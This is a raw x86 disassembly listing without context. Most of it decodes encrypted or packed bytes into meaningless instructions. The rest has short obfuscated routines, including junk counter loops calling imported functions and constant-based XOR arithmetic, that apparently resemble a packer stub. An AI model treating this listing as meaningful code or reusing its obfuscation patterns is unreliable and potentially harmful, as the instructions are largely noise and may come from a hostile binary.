  40e1ae:	aam    0x83
  40e1b0:	cmc    
  40e1b1:	inc    esi
  40e1b2:	push   ss
  40e1b3:	cmp    DWORD PTR ds:0x15168cc9,ebp
  40e1b9:	nop
  40e1ba:	lds    esi,FWORD PTR [edi]
  40e1bc:	xchg   ebx,eax
  40e1bd:	inc    edx
  40e1be:	cmp    ebp,DWORD PTR [ecx+0x77]
  40e1c1:	lds    ecx,FWORD PTR [ebx]
  40e1c3:	outs   dx,BYTE PTR ds:[esi]
  40e1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c5:	fnstsw WORD PTR [ecx+esi*2-0xffb6905]
  40e1cc:	cmp    al,0x41
  40e1ce:	xchg   BYTE PTR [ecx],bh
  40e1d0:	mov    ah,0x69
  40e1d2:	sub    cl,dh
  40e1d4:	test   BYTE PTR [edi],cl
  40e1d6:	rol    BYTE PTR ds:0x8e7519ed,cl
  40e1dc:	sbb    bl,BYTE PTR [edx+0x518bd720]
  40e1e2:	sbb    eax,0x51f4e31f
  40e1e7:	xchg   esp,eax
  40e1e8:	sub    esp,DWORD PTR [ecx+0x1ca6929d]
  40e1ee:	push   0xcdb8b08e
  40e1f3:	cmp    BYTE PTR [eax],0xf
  40e1f6:	push   0xb8b42f85
  40e1fb:	std    
  40e1fc:	jg     0x40e1f1
  40e1fe:	dec    eax
  40e1ff:	sbb    DWORD PTR [edx-0x55e8a9f8],esp
  40e205:	push   0x76fc86f6
  40e20a:	(bad)  
  40e20b:	lahf   
  40e20c:	lods   eax,DWORD PTR ds:[esi]
  40e20d:	popf   
  40e20e:	clc    
  40e20f:	sahf   
  40e210:	ret    
  40e211:	inc    ebp
  40e212:	xor    eax,0x51a65b96
  40e217:	or     DWORD PTR [ebx],edi
  40e219:	inc    ebx
  40e21a:	xchg   ebp,eax
  40e21b:	xchg   ebp,eax
  40e21c:	pop    edx
  40e21d:	fsub   DWORD PTR [eax+0x1d]
  40e220:	stc    
  40e221:	xchg   ebx,eax
  40e222:	xor    ch,BYTE PTR [ebp-0x7e]
  40e225:	cli    
  40e226:	mov    ch,BYTE PTR [eax+0x2bcc0903]
  40e22c:	retf   
  40e22d:	xchg   si,ax
  40e22f:	mov    WORD PTR [ebx],?
  40e231:	cmp    BYTE PTR [edi+0x31],dl
  40e234:	sar    ch,0x1e
  40e237:	jmp    0x5e3f:0xc8f70a44
  40e23e:	imul   ecx,DWORD PTR es:[ebx-0x5b],0xfffffff3
  40e243:	fimul  DWORD PTR [eax+0x71]
  40e246:	(bad)  
  40e247:	and    edx,edi
  40e249:	das    
  40e24a:	pop    eax
  40e24b:	dec    edx
  40e24c:	sub    edi,edx
  40e24e:	mov    ah,0xf4
  40e250:	mov    al,ds:0x87ff4486
  40e255:	push   esi
  40e256:	das    
  40e257:	sti    
  40e258:	cmp    esi,DWORD PTR [edi-0x45]
  40e25b:	inc    edx
  40e25c:	push   edx
  40e25e:	jmp    0x40e1ec
  40e260:	mov    al,ds:0xfc7d6e8f
  40e265:	mov    dl,0x44
  40e267:	fcmovnbe st,st(1)
  40e269:	icebp  
  40e26a:	adc    edx,ebp
  40e26c:	xor    ecx,ebx
  40e26e:	outs   dx,BYTE PTR ds:[esi]
  40e270:	mov    eax,0x73b1c968
  40e275:	leave  
  40e276:	in     eax,0xb5
  40e278:	sar    DWORD PTR [esi-0x39613323],1
  40e27e:	push   0x17c3c38c
  40e283:	imul   eax,DWORD PTR [edx],0x18
  40e286:	fdivr  QWORD PTR [ebx-0x2654bf2b]
  40e28c:	cli    
  40e28d:	jmp    FWORD PTR [ebx+0x50b1f194]
  40e293:	cmp    esp,ebp
  40e295:	repz mov edx,0x1bc8d7e0
  40e29b:	mov    eax,ds:0x3276149e
  40e2a0:	es adc eax,0x542f1ae3
  40e2a6:	push   ebx
  40e2a7:	or     DWORD PTR [eax+0x1fc8a73e],edi
  40e2ad:	jmp    0xc896:0xb62c7a49
  40e2b4:	std    
  40e2b5:	popa   
  40e2b6:	mov    DWORD PTR ds:0x2fc54c87,ebx
  40e2bc:	retf   
  40e2bd:	mov    edi,0xe01fefe9
  40e2c2:	sbb    dl,BYTE PTR [ecx+ebp*4+0x70715c4e]
  40e2c9:	iret   
  40e2ca:	add    eax,0x99e8790d
  40e2cf:	outs   dx,DWORD PTR ds:[esi]
  40e2d0:	pop    ebx
  40e2d1:	jbe    0x40e2c9
  40e2d3:	push   eax
  40e2d4:	jmp    FWORD PTR [eax+0x379f29cc]
  40e2da:	ins    BYTE PTR es:[edi],dx
  40e2db:	stc    
  40e2dc:	jnp    0x40e317
  40e2de:	sbb    eax,DWORD PTR [edx]
  40e2e0:	push   ecx
  40e2e1:	jmp    0x7804:0x8a362a7e
  40e2e8:	pop    ebp
  40e2e9:	aad    0x22
  40e2eb:	por    mm2,QWORD PTR [ecx]
  40e2ee:	int3   
  40e2ef:	les    ebx,FWORD PTR [ecx+0x64e1b484]
  40e2f5:	jo     0x40e29e
  40e2f7:	cld    
  40e2f8:	jo     0x40e2bf
  40e2fa:	jo     0x5c835a0
  40e300:	outs   dx,BYTE PTR ds:[esi]
  40e301:	mov    esi,0xc2e7bf06
  40e306:	aam    0x89
  40e308:	adc    eax,edi
  40e30a:	outs   dx,BYTE PTR ds:[esi]
  40e30b:	pop    es
  40e30c:	je     0x40e354
  40e30e:	test   eax,0x6ca97c93
  40e313:	push   esp
  40e314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e315:	fstp   DWORD PTR [ebp+eiz*8-0x6e08ab43]
  40e31c:	jns    0x40e2de
  40e31e:	sti    
  40e31f:	ret    
  40e320:	adc    DWORD PTR [eax+0x5],ebx
  40e323:	dec    edx
  40e324:	cmc    
  40e325:	add    eax,0x70ba8b88
  40e32a:	lods   al,BYTE PTR ds:[esi]
  40e32b:	mov    WORD PTR [edx-0x3c9ce45d],es
  40e331:	cmp    BYTE PTR [eax+0x4b],ah
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433617,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433727,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4336eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43366b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4336bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433667,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4336af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	jmp    0x3f725ab6
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e393
  40e3cc:	(bad)  
  40e3cd:	push   ds
  40e3ce:	adc    eax,0xd94a6efb
  40e3d3:	jecxz  0x40e3b7
  40e3d5:	push   0x41832b1a
  40e3da:	retf   0x8508
  40e3dd:	dec    edi
  40e3de:	pop    edi
  40e3df:	inc    eax
  40e3e0:	push   esi
  40e3e1:	and    al,0xd9
  40e3e3:	mov    al,0x3e
  40e3e5:	outs   dx,DWORD PTR ds:[esi]
  40e3e6:	retf   0x67ce
  40e3e9:	add    cl,BYTE PTR [esi]
  40e3eb:	mov    esp,es
  40e3ed:	je     0x40e387
  40e3ef:	dec    ebx
  40e3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f1:	push   edx
  40e3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f3:	or     dl,BYTE PTR [ecx+0x227df8b5]
  40e3f9:	push   ecx
  40e3fa:	jns    0x40e428
  40e3fc:	mov    ebx,0x19d0cdbb
  40e401:	mov    bh,0xb4
  40e403:	imul   esi,DWORD PTR [ebx],0x5569efdb
  40e409:	mov    bh,0x24
  40e40b:	push   esp
  40e40c:	push   esi
  40e40d:	cmp    edx,edx
  40e40f:	jle    0x40e46a
  40e411:	hlt    
  40e412:	std    
  40e413:	js     0x40e3c1
  40e415:	adc    ebx,ebp
  40e417:	popa   
  40e418:	aas    
  40e419:	retf   0x3b72
  40e41c:	ret    
  40e41d:	cs push 0x7cd792a9
  40e423:	outs   dx,DWORD PTR ds:[esi]
  40e424:	xchg   ebx,eax
  40e425:	das    
  40e426:	repz ror DWORD PTR [edx],0x5
  40e42a:	jmp    0x40e3ed
  40e42c:	add    DWORD PTR [edi],ecx
  40e42e:	inc    edx
  40e42f:	mov    eax,ds:0xa7327a40
  40e434:	retf   
  40e435:	mov    BYTE PTR [edx+0x291e1b4e],cl
  40e43b:	xor    ebp,DWORD PTR [ebp+0x44654ec0]
  40e441:	add    eax,0xf7c71154
  40e446:	ret    
  40e447:	push   esp
  40e448:	mov    dl,ah
  40e44a:	imul   esp,ecx,0x47884c72
  40e450:	mov    edi,0x4f6c996
  40e455:	pop    ds
  40e456:	(bad)  
  40e457:	sub    edi,DWORD PTR [esi+0x58]
  40e45a:	and    eax,0xf2bdd8a7
  40e45f:	mov    eax,0x872aab24
  40e464:	in     al,dx
  40e465:	jecxz  0x40e435
  40e467:	popf   
  40e468:	mov    dh,0xa6
  40e46a:	sub    al,BYTE PTR [edi-0x6eb6df0b]
  40e470:	jp     0x40e46f
  40e472:	dec    ecx
  40e473:	cs mov ah,0x8e
  40e476:	(bad)  [edi+edi*2]
  40e479:	imul   edi,DWORD PTR [bp+si],0xc0ad05b6
  40e480:	sbb    al,0xa5
  40e482:	xchg   ebx,eax
  40e483:	mov    edi,0xa93310e7
  40e488:	(bad)  
  40e489:	jp     0x40e47f
  40e48b:	loope  0x40e43a
  40e48d:	cmp    dh,BYTE PTR [edx-0x1db4f7c3]
  40e493:	ss js  0x40e467
  40e496:	pop    eax
  40e497:	dec    ebx
  40e498:	add    esp,edx
  40e49a:	xor    BYTE PTR [eax],0x6b
  40e49d:	push   ebx
  40e49e:	cwde   
  40e49f:	sbb    DWORD PTR [edx+0x5af874e4],eax
  40e4a5:	cmp    DWORD PTR [eax+esi*1-0x3c],edi
  40e4a9:	cmp    bh,BYTE PTR [ecx-0x69cad8b]
  40e4af:	jge    0x40e466
  40e4b1:	sbb    dh,ch
  40e4b3:	daa    
  40e4b4:	and    DWORD PTR [eax],ebx
  40e4b6:	or     BYTE PTR ds:0x5c52d40d,0x84
  40e4bd:	mov    edx,0xed00ac49
  40e4c2:	retf   
  40e4c3:	dec    esi
  40e4c4:	or     eax,0xc15d9e87
  40e4c9:	cmp    al,0x64
  40e4cb:	out    dx,al
  40e4cc:	(bad)  
  40e4ce:	in     al,dx
  40e4cf:	(bad)  
  40e4d0:	call   DWORD PTR [edx]
  40e4d2:	ins    DWORD PTR es:[edi],dx
  40e4d3:	jp     0x40e4e3
  40e4d5:	sub    dh,BYTE PTR [esi]
  40e4d7:	ins    BYTE PTR es:[edi],dx
  40e4d8:	pop    ds
  40e4d9:	lahf   
  40e4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4db:	je     0x40e6db
  40e4e1:	add    DWORD PTR ds:0x433733,0x32bd
  40e4eb:	mov    eax,DWORD PTR [ebp-0x4]
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433617,0x4336bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433733,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4336a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4336a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4336a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4336a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4336a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4336a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4336a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4336a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4336bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4336b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43367b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x84c49328
  40e5c1:	das    
  40e5c2:	fwait
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5fc
  40e5cc:	add    DWORD PTR [edx],edi
  40e5ce:	push   eax
  40e5cf:	xchg   edi,eax
  40e5d0:	xor    BYTE PTR [edx],bh
  40e5d2:	out    0x63,eax
  40e5d4:	jo     0x40e58b
  40e5d6:	cli    
  40e5d7:	fwait
  40e5d8:	push   0x5abcef36
  40e5dd:	addr16 inc edi
  40e5df:	test   eax,0x8c093c69
  40e5e4:	inc    edi
  40e5e5:	inc    esp
  40e5e6:	xchg   edi,eax
  40e5e7:	loop   0x40e5a5
  40e5e9:	int3   
  40e5ea:	adc    eax,DWORD PTR [edi-0x39]
  40e5ed:	hlt    
  40e5ee:	sti    
  40e5ef:	cld    
  40e5f0:	fsubr  QWORD PTR [ebx-0x30]
  40e5f3:	sub    al,BYTE PTR [ecx]
  40e5f5:	imul   eax,DWORD PTR [edi],0x68a5ec4b
  40e5fb:	jo     0x40e5dd
  40e5fd:	xchg   BYTE PTR [esi-0x14],dl
  40e600:	mov    bh,0xb4
  40e602:	cwde   
  40e603:	stos   BYTE PTR es:[edi],al
  40e604:	push   esp
  40e605:	push   0xed44d962
  40e60a:	lock inc ebp
  40e60c:	pop    edi
  40e60d:	mov    ds:0x8b18bab,al
  40e612:	push   cs
  40e613:	stos   DWORD PTR es:[edi],eax
  40e614:	pop    ebx
  40e615:	in     al,0x12
  40e617:	mov    bh,0x41
  40e619:	aad    0xb9
  40e61b:	in     eax,dx
  40e61c:	rcl    DWORD PTR [ebx-0x56],0x14
  40e620:	sbb    DWORD PTR [edi+0x6e150b09],edi
  40e626:	fnstsw WORD PTR [ebx-0x78]
  40e629:	jge    0x40e5b5
  40e62b:	sbb    ebx,0x8de3b836
  40e631:	adc    DWORD PTR [edi+0x35887912],ecx
  40e637:	sub    bl,BYTE PTR [ebp-0x509a73fa]
  40e63d:	mov    es,WORD PTR [ecx]
  40e63f:	ja     0x40e675
  40e641:	sbb    al,0x67
  40e643:	dec    esi
  40e644:	mov    ecx,0x168071ed
  40e649:	cld    
  40e64a:	xor    WORD PTR [ebx-0x355623b9],0x5cd5
  40e653:	add    cl,dl
  40e655:	or     esp,DWORD PTR [ebp+edx*4+0x66]
  40e659:	(bad)  
  40e65a:	repnz lahf 
  40e65c:	push   esi
  40e65d:	mov    eax,0x97c2c4a9
  40e662:	ja     0x40e63d
  40e664:	and    ebx,DWORD PTR [ebp-0x2e307d36]
  40e66a:	int    0xbf
  40e66c:	xlat   BYTE PTR ds:[ebx]
  40e66d:	adc    BYTE PTR [edx],ch
  40e66f:	lahf   
  40e670:	leave  
  40e671:	push   0xff48e4cc
  40e676:	xchg   edx,eax
  40e677:	scas   al,BYTE PTR es:[edi]
  40e678:	dec    ebx
  40e679:	xor    al,0xab
  40e67b:	std    
  40e67c:	dec    edx
  40e67d:	in     al,0x20
  40e67f:	sbb    al,0xc
  40e681:	xor    eax,0x4e1e6a46
  40e686:	stos   DWORD PTR es:[edi],eax
  40e687:	call   0x2c35:0xf7276950
  40e68e:	pop    ebx
  40e68f:	cld    
  40e690:	xchg   ecx,eax
  40e691:	or     ecx,edi
  40e693:	mov    ds:0xa0579c53,eax
  40e698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e699:	add    dh,BYTE PTR [eax]
  40e69b:	mov    dh,0xe0
  40e69d:	mov    ch,0x65
  40e69f:	outs   dx,BYTE PTR ds:[esi]
  40e6a0:	cmp    DWORD PTR [ebx+esi*8],eax
  40e6a3:	stos   DWORD PTR es:[edi],eax
  40e6a4:	test   al,0x3a
  40e6a6:	mov    ?,WORD PTR [ebx+0x11]
  40e6a9:	div    BYTE PTR [ebp-0x7ff2da25]
  40e6af:	rcr    BYTE PTR [edi],cl
  40e6b1:	jnp    0x40e6a4
  40e6b3:	(bad)  
  40e6b4:	fstp   TBYTE PTR [ecx-0x54]
  40e6b7:	iret   
  40e6b8:	in     al,0xdb
  40e6ba:	mov    ?,WORD PTR [ebx]
  40e6bc:	pushf  
  40e6bd:	adc    al,0xb8
  40e6bf:	push   es
  40e6c0:	clc    
  40e6c1:	ret    
  40e6c2:	xchg   eax,ebp
  40e6c4:	mov    esi,0x2f098239
  40e6c9:	push   ebp
  40e6ca:	imul   edx,DWORD PTR [esi+0x23],0xffffffdd
  40e6ce:	js     0x40e714
  40e6d0:	xor    al,0x1d
  40e6d2:	push   eax
  40e6d3:	popf   
  40e6d4:	xor    DWORD PTR [ecx-0x28d35612],0x5e
  40e6db:	mov    eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x5a9a30a1
  40e707:	cmp    al,0xa4
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	div    esp
  40e713:	(bad)  
  40e714:	call   0x54ed:0xa4f92211
  40e71b:	mov    bl,0x70
  40e71d:	dec    ebp
  40e71e:	or     ebp,eax
  40e720:	jg     0x40e70b
  40e722:	push   ecx
  40e723:	mov    dl,BYTE PTR [esi-0x25]
  40e726:	in     al,dx
  40e727:	in     al,0xbe
  40e729:	pop    ebx
  40e72a:	mov    edx,0x2e39a59f
  40e72f:	mov    al,0x3b
  40e731:	dec    BYTE PTR [eiz*2+0x58b0b414]
  40e738:	mov    esp,0x17271de
  40e73d:	popa   
  40e73e:	inc    esp
  40e73f:	xor    esi,DWORD PTR [ecx-0x5f]
  40e742:	test   eax,0x75a1b34b
  40e747:	add    dl,bh
  40e749:	retf   
  40e74a:	xchg   ecx,eax
  40e74b:	dec    edi
  40e74c:	add    DWORD PTR [edx+0x58],ecx
  40e74f:	fld    QWORD PTR [ebx+0x7dc3c764]
  40e756:	les    eax,FWORD PTR ds:[edx]
  40e759:	nop
  40e75a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e75c:	mov    ah,0x44
  40e75e:	rol    cl,cl
  40e760:	shl    BYTE PTR [eax],cl
  40e762:	mov    al,0x97
  40e764:	mov    WORD PTR [edi],gs
  40e766:	xchg   ebx,eax
  40e767:	push   esp
  40e768:	imul   edi,DWORD PTR [eax+0x736b295c],0x7398e13e
  40e772:	cld    
  40e773:	dec    edx
  40e774:	(bad)  [ecx]
  40e776:	add    BYTE PTR [edi-0x4b],bh
  40e779:	sbb    al,0x83
  40e77b:	mov    ds:0x9d57e0bb,eax
  40e780:	jle    0x40e7ca
  40e782:	leave  
  40e783:	adc    ebx,DWORD PTR [edi+esi*1]
  40e786:	lods   eax,DWORD PTR ds:[esi]
  40e787:	ficom  DWORD PTR [edi-0x7e]
  40e78a:	add    ch,BYTE PTR [ecx-0x54]
  40e78d:	pop    ebx
  40e78e:	je     0x40e805
  40e790:	xchg   edx,eax
  40e791:	mov    bh,0x85
  40e793:	push   ss
  40e794:	add    eax,ebx
  40e796:	mov    cl,0x5d
  40e798:	push   esi
  40e799:	sbb    eax,0xe988867d
  40e79e:	rcr    bl,1
  40e7a0:	or     cl,0x26
  40e7a3:	(bad)  
  40e7a4:	or     BYTE PTR [ebx-0x7f871b06],dl
  40e7aa:	xlat   BYTE PTR ds:[ebx]
  40e7ab:	repz fs xor esi,ebx
  40e7af:	int3   
  40e7b0:	pop    ds
  40e7b1:	popf   
  40e7b2:	out    0x66,al
  40e7b4:	jne    0x40e830
  40e7b6:	inc    ebx
  40e7b7:	inc    edi
  40e7b8:	out    0x7b,al
  40e7ba:	mov    bl,0xf7
  40e7bc:	sti    
  40e7bd:	icebp  
  40e7be:	mov    eax,ds:0x70062cbf
  40e7c3:	or     edi,ebx
  40e7c5:	jb     0x40e77c
  40e7c7:	mov    dh,0x56
  40e7c9:	data16 fbld TBYTE PTR [edx-0x1]
  40e7cd:	mov    ebp,0xdb1de79f
  40e7d2:	sbb    edx,edi
  40e7d4:	shl    edi,cl
  40e7d6:	idiv   ebp
  40e7d8:	rcr    DWORD PTR [esi+0x66f1131f],cl
  40e7de:	push   ebp
  40e7df:	fnsave [ebx+0x7a]
  40e7e2:	pop    ebp
  40e7e3:	sbb    ah,bl
  40e7e5:	fisubr DWORD PTR [eax]
  40e7e7:	sub    DWORD PTR [ebp+edx*4-0x30],esp
  40e7eb:	xor    al,0xb3
  40e7ed:	stc    
  40e7ee:	int3   
  40e7ef:	ja     0x40e785
  40e7f1:	xchg   esp,edx
  40e7f3:	sbb    ah,BYTE PTR [ebp-0x634f0bd8]
  40e7f9:	mov    edi,0xa4b1d78d
  40e7fe:	sub    ebp,ebp
  40e800:	std    
  40e801:	jbe    0x40e794
  40e803:	inc    edx
  40e804:	push   cs
  40e805:	push   edi
  40e806:	jnp    0x40e841
  40e808:	mov    ds:0xe70b17fb,eax
  40e80d:	xor    eax,0x13fdd848
  40e812:	scas   eax,DWORD PTR es:[edi]
  40e813:	adc    eax,0x17875136
  40e818:	out    0x43,eax
  40e81a:	sub    al,0x6e
  40e81c:	je     0x40e7d2
  40e81e:	mov    edi,0x62a3f8a1
  40e823:	cmp    al,0x41
  40e825:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43373f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43373f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43373f,ebx
  40e870:	cmp    DWORD PTR ds:0x43373f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43373f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4336bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4336ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4336ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4336ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43367f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4336ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4336ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4336ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4336f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4336f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4336f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4336f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4336f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4336f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4336f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4336f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4336a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43362b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43361b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43361b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43361b,edi
  40e999:	cmp    DWORD PTR ds:0x43361b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4336bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43361b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43361b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43366b,0x43360f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433737,0x4336bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43367f,0x4336bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4336ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43361f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x16103a68,al
  40ea30:	retf   0x94e5
  40ea33:	out    dx,eax
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	sbb    DWORD PTR [ecx],ebp
  40ea3d:	mov    ah,0x3b
  40ea3f:	test   eax,0x40f7c0ff
  40ea44:	jmp    edx
  40ea46:	pusha  
  40ea47:	mov    esp,0x941cd4
  40ea4c:	mov    bh,BYTE PTR [esi]
  40ea4e:	cmp    esp,esi
  40ea50:	mov    bl,BYTE PTR [edi+0x79e51173]
  40ea56:	ret    
  40ea57:	(bad)  
  40ea58:	cmp    BYTE PTR [ebp+0x75],dl
  40ea5b:	inc    ebp
  40ea5c:	pop    ss
  40ea5d:	xor    esi,DWORD PTR [ebx-0x25]
  40ea60:	aas    
  40ea61:	scas   eax,DWORD PTR es:[edi]
  40ea62:	mov    esp,cs
  40ea64:	pop    ds
  40ea65:	mov    ?,esp
  40ea67:	lds    esi,FWORD PTR [esi]
  40ea69:	ins    BYTE PTR es:[edi],dx
  40ea6a:	jne    0x40ea6b
  40ea6c:	cmp    eax,0x53f4f1d8
  40ea71:	int3   
  40ea72:	push   ebx
